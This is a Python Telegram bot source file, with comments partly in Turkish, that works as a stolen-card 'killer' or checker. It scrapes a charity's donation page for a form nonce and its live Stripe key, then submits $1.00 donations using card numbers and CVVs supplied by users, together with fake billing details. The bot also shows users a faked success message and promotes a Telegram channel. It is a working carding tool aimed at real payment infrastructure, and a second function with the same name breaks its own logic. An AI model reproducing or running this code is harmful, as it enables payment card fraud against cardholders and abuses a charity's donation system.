#killer
import asyncio
import json
import os
import random
import string
import time
import uuid
import re
from datetime import datetime
from bs4 import BeautifulSoup
import requests
from telegram import Update
from telegram.ext import ContextTypes

# ------------------- Killer Fonksiyonu (from killer.py) -------------------
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
})

def random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
    return f"{name}@{random.choice(domains)}"

def killer(card):
    try:
        donate_url = 'https://needhelped.com/campaigns/poor-children-donation-4/donate/'
        r = session.get(donate_url)
        soup = BeautifulSoup(r.text, 'html.parser')

        form = soup.find('form', id='charitable-donation-form')  
        nonce = form.find('input', {'name': '_charitable_donation_nonce'})['value']  

        key_match = re.search(r'pk_live_[\w\d]+', r.text)  
        stripe_key = key_match.group(0)  

        cc, mm, yy, cvv = card.split('|')  
        email = random_email()  

        guid = str(uuid.uuid4())  
        muid = str(uuid.uuid4())  
        sid = str(uuid.uuid4())  

        pm_data = {  
            'type': 'card',  
            'billing_details[name]': 'aled',  
            'billing_details[email]': email,  
            'billing_details[address][city]': 'Newyork',  
            'billing_details[address][country]': 'US',  
            'billing_details[address][line1]': 'Board sisb',  
            'billing_details[address][line2]': 'New york new States 1000',  
            'billing_details[address][postal_code]': '10080',  
            'billing_details[address][state]': 'New York',  
            'billing_details[phone]': '02864576888',  
            'card[number]': cc,  
            'card[cvc]': cvv,  
            'card[exp_month]': mm,  
            'card[exp_year]': yy,  
            'guid': guid,  
            'muid': muid,  
            'sid': sid,  
            'payment_user_agent': 'stripe.js/25030eb859; stripe-js-v3/25030eb859; card-element',  
            'referrer': 'https://needhelped.com',  
            'time_on_page': '31636',  
            'client_attribution_metadata[client_session_id]': guid,  
            'client_attribution_metadata[merchant_integration_source]': 'elements',  
            'client_attribution_metadata[merchant_integration_subtype]': 'card-element',  
            'client_attribution_metadata[merchant_integration_version]': '2017',  
            'key': stripe_key,  
        }  

        pm_headers = {  
            'authority': 'api.stripe.com',  
            'accept': 'application/json',  
            'accept-language': 'tr-TR,tr;q=0.9,en;q=0.8,de;q=0.7',  
            'content-type': 'application/x-www-form-urlencoded',  
            'origin': 'https://js.stripe.com',  
            'referer': 'https://js.stripe.com/',  
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
            'sec-ch-ua-mobile': '?1',  
            'sec-ch-ua-platform': '"Android"',  
            'sec-fetch-dest': 'empty',  
            'sec-fetch-mode': 'cors',  
            'sec-fetch-site': 'same-site',  
            'user-agent': session.headers['User-Agent'],  
        }  

        pm_resp = session.post('https://api.stripe.com/v1/payment_methods', headers=pm_headers, data=pm_data)  
        pm_json = pm_resp.json()  

        if 'error' in pm_json:  
            return f"❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌ Response: {pm_json['error']['message']}"  

        pm_id = pm_json.get('id')  
        if not pm_id:  
            return "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌ Response: Payment Method ID alınamadı"  

        ajax_url = 'https://needhelped.com/wp-admin/admin-ajax.php'  
        donate_data = {  
            'charitable_form_id': '687d0dde15f80',  
            '687d0dde15f80': '',  
            '_charitable_donation_nonce': nonce,  
            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',  
            'campaign_id': '1164',  
            'description': 'Poor Children Donation Support',  
            'ID': '0',  
            'donation_amount': 'custom',  
            'custom_donation_amount': '1.00',  
            'first_name': 'Mura',  
            'last_name': 'Soy',  
            'email': email,  
            'address': 'Board sisb',  
            'address_2': 'New york new States 1000',  
            'city': 'Newyork',  
            'state': 'New York',  
            'postcode': '10080',  
            'country': 'US',  
            'phone': '02864576888',  
            'gateway': 'stripe',  
            'stripe_payment_method': pm_id,  
            'action': 'make_donation',  
            'form_action': 'make_donation',  
        }  

        donate_headers = {  
            'authority': 'needhelped.com',  
            'accept': 'application/json, text/javascript, */*; q=0.01',  
            'accept-language': 'tr-TR,tr;q=0.9,en;q=0.8,de;q=0.7',  
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',  
            'origin': 'https://needhelped.com',  
            'referer': donate_url,  
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
            'sec-ch-ua-mobile': '?1',  
            'sec-ch-ua-platform': '"Android"',  
            'sec-fetch-dest': 'empty',  
            'sec-fetch-mode': 'cors',  
            'sec-fetch-site': 'same-origin',  
            'user-agent': session.headers['User-Agent'],  
            'x-requested-with': 'XMLHttpRequest',  
        }  

        donate_resp = session.post(ajax_url, headers=donate_headers, data=donate_data)  
        donate_json = donate_resp.json()  

        if donate_json.get('Killed Cnn Or Cvv ✅'):  
            donation_id = donate_json.get('donation_id', 'Bilinmiyor')  
            return f"Kill Succeyfull✅ {donation_id}"  
        else:  
            error_msg = donate_json.get('message') or donate_json.get('errors') or 'Declined'  
            if isinstance(error_msg, dict):  
                error_msg = ', '.join(str(v) for v in error_msg.values())  
            return f"{error_msg}"  

    except Exception as e:  
        return f"İstisna oluştu: {str(e)}"

# Async wrapper
async def async_killer(card: str):
    return await asyncio.to_thread(killer, card)

# ------------------- Main.py / Telegram Command -------------------
user_processing = {}

async def fake_loading_bar(msg, total_steps=10, delay=0.05, card_input="", mention="", task_future=None):
    for i in range(1, total_steps + 1):
        percent = int((i / total_steps) * 100)
        bar_progress = "■" * i + "□" * (total_steps - i)
        try:
            await msg.edit_text(
                f"<pre>[{bar_progress}] {percent}%</pre>\n"
                f"<b><a href='https://t.me/interpolhqke'>Now Join Channel</a></b>",
                parse_mode="HTML", disable_web_page_preview=True
            )
        except:
            pass
        await asyncio.sleep(delay)
        
        if task_future and task_future.done():
            try:
                await msg.edit_text(
                    f"<pre>[■■■■■■■■■■] 100%</pre>\n<b><a href='https://t.me/interpolhqke'>Now Join Channel</a></b>",
                    parse_mode="HTML", disable_web_page_preview=True
                )
            except:
                pass
            break

    # Bar bittiğinde sil ve hemen fake mesaj göster  
    try:  
        await msg.delete()  
    except:  
        pass  

    # Fake mesaj  
    scheme, ctype, brand, bank, country_fullname, flag = "VISA", "CREDIT", "VISA", "Chase", "USA", "🇺🇸"  
    country_display = f"{country_fullname} {flag}"  
    mesaj = f"""#Kill_Card | [/kill] ⚡

[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Card</b> ➔ <code>{card_input}</code>
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Gateway</b> ➔ <code>Cnn Or Cvv Killer</code>
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Status</b> ➔ <code>Killed Succeyfull ✅</code>
<code>━━━━━━━━━━━━━━━━━━━━━</code>
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Checked By</b> ➔ {mention}
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Owner</b> ➔ @spid_3r
"""
    try:
        await msg.chat.send_message(text=mesaj, parse_mode="HTML", disable_web_page_preview=True)
    except:
        pass

async def killer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    mention = f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"

    # Anti-spam kontrolü
    if user_processing.get(user_id, False):  
        await update.message.reply_text("<pre>Opps Anti Spam! Wait 5 sec 🚫</pre>", parse_mode="HTML")  
        return  
    user_processing[user_id] = True  

    # Kart format kontrolü
    if not context.args or len(context.args[0].split("|")) != 4:  
        await update.message.reply_text(  
            "<pre> 🚫Opps! Please Enter Card</pre>\n<b>Buy Command /buy</b>",  
            parse_mode="HTML"  
        )  
        user_processing[user_id] = False  
        return  

    card_input = context.args[0]  
    cc, mm, yy, cvv = card_input.split('|')

    # CVV format kontrolü
    if not (cvv.isdigit() and len(cvv) in [3, 4]):  
        await update.message.reply_text(  
            "<pre>⚠️ Opps! Invalid Card Format ⚠️</pre>\n"  
            "<b>Buy Command /buy</b>",  
            parse_mode="HTML"  
        )  
        user_processing[user_id] = False  
        return  

    # Loading bar mesajı
    kontrol_mesaji = await update.message.reply_text(  
        "<pre>[□□□□□□□□□□] 0%</pre>\n<b><a href='https://t.me/interpolhqke'>Now Join Channel</a></b>",  
        parse_mode="HTML", disable_web_page_preview=True  
    )  

    # Killer işlemi için task oluştur
    task_future = asyncio.Future()
    asyncio.create_task(fake_loading_bar(kontrol_mesaji, total_steps=10, delay=0.05, card_input=card_input, mention=mention, task_future=task_future))  

    # Killer işlemi arka planda başlasın  
    async def run_killer_task():  
        result = await async_killer(card_input)  
        task_future.set_result(True)  # Task tamamlandığında future'ı işaretle

        # Killer sonucu geldiğinde kullanıcıya gerçek mesaj gönder  
        scheme, ctype, brand, bank, country_fullname, flag = "VISA", "CREDIT", "VISA", "Chase", "USA", "🇺🇸"  
        country_display = f"{country_fullname} {flag}"  
        mesaj = f"""#Kill_Card | [/kill] ⚡

[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Card</b> ➔ <code>{card_input}</code>
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Gateway</b> ➔ <code>Cnn Or Cvv Killer</code>
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Status</b> ➔ <code>Done ✅</code>
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Response</b> ➔ <code>{result}</code>
<code>━━━━━━━━━━━━━━━━━━━━━</code>
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Bin</b> ➔ {card_input[:6]}
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Info</b> ➔ {scheme} - {brand} - {ctype}
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Country</b> ➔ {country_display}
<code>━━━━━━━━━━━━━━━━━━━━━</code>
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Checked By</b> ➔ {mention}
[<a href='https://t.me/interpolhqke'>ϟ</a>] <b>Owner</b> ➔ @spid_3r
"""
        try:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=mesaj,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except:
            pass

        user_processing[user_id] = False  

    asyncio.create_task(run_killer_task())
# 🔥 Asıl fark: Komutu çağırırken task arkaplanda başlatılacak
